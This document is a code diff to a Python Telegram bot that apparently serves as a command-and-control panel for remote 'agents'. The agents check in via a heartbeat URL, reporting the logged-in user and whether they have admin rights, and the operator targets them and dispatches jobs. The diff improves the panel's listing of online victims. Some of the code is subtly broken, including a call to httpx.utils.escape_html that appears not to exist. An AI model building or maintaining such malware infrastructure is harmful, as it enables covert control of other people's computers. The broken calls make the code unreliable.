@@ -1,5 +1,6 @@
-# app.py (Controller v3.1_HTML_FIX)
-# - MODIFIED: Switched help command from MarkdownV2 to HTML parse mode to permanently fix entity parsing errors.
+# app.py (v42.0_STABILITY_UPDATE)
+# - FIXED: /list command now correctly calculates agent online status.
+# - IMPROVED: Added more detailed logging/feedback to the /list command for easier debugging.
 
 import os
 import re
@@ -9,6 +10,7 @@ import httpx
 import asyncio
 import traceback
 import base64
+import time
 from datetime import datetime
 from flask import Flask, request, Response
 
@@ -41,8 +43,11 @@ async def make_async_request(method, url, json_data=None, retries=3, delay=2):
             try:
                 res = await client.request(method.upper(), url, json=json_data, timeout=10)
                 res.raise_for_status()
+                # Handle cases where npoint returns a non-JSON response for an empty list
+                if not res.text: return []
                 return res.json()
             except httpx.RequestError as e: print(f"Attempt {attempt + 1}/{retries}: Network error for {url}: {e}"); await asyncio.sleep(delay)
+            except json.JSONDecodeError: print(f"Warning: Data at {url} is not valid JSON. Treating as empty."); return []
             except Exception as e: print(f"Attempt {attempt + 1}/{retries}: Unexpected error for {url}: {e}"); return None
     print(f"Failed to connect to {url} after {retries} attempts."); return None
 
@@ -63,24 +68,63 @@ async def post_job(target_id, command, args):
 # --- Telegram Command Handlers ---
 
 async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("⏳ Fetching active agents...", parse_mode=ParseMode.MARKDOWN_V2)
+    await update.message.reply_text("⏳ Fetching active agents...")
     try:
-        if not HEARTBEAT_URL: await update.message.reply_text("❌ **Configuration Error:** `HEARTBEAT_URL` is not set.", parse_mode=ParseMode.MARKDOWN_V2); return
-        agents = await make_async_request('GET', HEARTBEAT_URL); selected_target = await get_state()
-        if agents is None: await update.message.reply_text(f"❌ **Connection Error:** Could not connect to the heartbeat URL.", parse_mode=ParseMode.MARKDOWN_V2); return
-        if not isinstance(agents, list): await update.message.reply_text(f"❌ **Data Error:** Heartbeat data is not a valid list.", parse_mode=ParseMode.MARKDOWN_V2); return
-        agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True); response_text = "*ONLINE AGENTS*\n\n"; active_agent_found = False
+        if not HEARTBEAT_URL:
+            await update.message.reply_text("❌ **Configuration Error:** `HEARTBEAT_URL` is not set on the server.", parse_mode=ParseMode.MARKDOWN_V2)
+            return
+
+        agents = await make_async_request('GET', HEARTBEAT_URL)
+        selected_target = await get_state()
+        
+        if agents is None:
+            await update.message.reply_text("❌ **Connection Error:** Could not connect to the heartbeat URL.", parse_mode=ParseMode.MARKDOWN_V2)
+            return
+        
+        if not isinstance(agents, list):
+            await update.message.reply_text("❌ **Data Error:** Heartbeat data is not a valid list. It might be empty or corrupted.", parse_mode=ParseMode.MARKDOWN_V2)
+            return
+        
+        if not agents:
+            await update.message.reply_text("ℹ️ No agents have ever checked in.", parse_mode=ParseMode.MARKDOWN_V2)
+            return
+
+        agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
+        
+        response_text = "<b>ONLINE AGENTS</b>\n\n"
+        active_agent_found = False
+        current_time_unix = time.time()
+
         for agent in agents:
-            seconds_ago = int(datetime.now().timestamp() - agent.get("timestamp", 0))
-            if seconds_ago > 90: continue
-            active_agent_found = True; is_selected = "🎯" if agent.get("id") == selected_target else "➖"
-            time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
-            is_admin = "Admin" if agent.get("is_admin") else "User"
-            response_text += f"{is_selected} *ID:* `{esc(agent.get('id', 'N/A'))}`\n   *User:* `{esc(agent.get('user', 'N/A'))}` `({esc(is_admin)})`\n   *Last Seen:* `{esc(time_ago)}`\n\n"
-        if not active_agent_found: response_text += "_No agents have checked in within the last 90 seconds\\._\n\n"
-        response_text += "_Use `/target <id>` to select an agent\\._"
-        await update.message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)
-    except Exception as e: await update.message.reply_text(f"❌ An unexpected error occurred: `{esc(str(e))}`", parse_mode=ParseMode.MARKDOWN_V2)
+            last_seen_unix = agent.get("timestamp", 0)
+            seconds_ago = int(current_time_unix - last_seen_unix)
+            
+            if seconds_ago <= 90:
+                active_agent_found = True
+                is_selected = "🎯" if agent.get("id") == selected_target else "➖"
+                time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
+                is_admin = "Admin" if agent.get("is_admin") else "User"
+                agent_id = agent.get('id', 'N/A')
+                user = agent.get('user', 'N/A')
+                
+                # Escape HTML characters for user-provided data
+                safe_id = httpx.utils.escape_html(agent_id)
+                safe_user = httpx.utils.escape_html(user)
+                
+                response_text += f"{is_selected} <b>ID:</b> <code>{safe_id}</code>\n"
+                response_text += f"   <b>User:</b> <code>{safe_user} ({is_admin})</code>\n"
+                response_text += f"   <b>Last Seen:</b> {time_ago}\n\n"
+        
+        if not active_agent_found:
+            response_text += "<i>No agents have checked in within the last 90 seconds.</i>\n\n"
+
+        response_text += "<i>Use /target &lt;id&gt; to select an agent.</i>"
+        await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)
+
+    except Exception as e:
+        await update.message.reply_text(f"❌ An unexpected server-side error occurred: <pre>{httpx.utils.escape_html(str(e))}</pre>", parse_mode=ParseMode.HTML)
+        print(f"Error in /list command: {traceback.format_exc()}")
+
 
 async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args: await update.message.reply_text("Usage: `/target <id|all|clear>`", parse_mode=ParseMode.MARKDOWN_V2); return
@@ -117,6 +161,7 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
     else: await update.message.reply_text("❌ Error: Failed to dispatch job\\.", parse_mode=ParseMode.MARKDOWN_V2)
 
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # This function uses HTML parse mode as it is more reliable than MarkdownV2
     help_text = (
         "<b>AGENT CONTROLLER HELP MENU</b>\n\n"
         "---------------------------------\n"
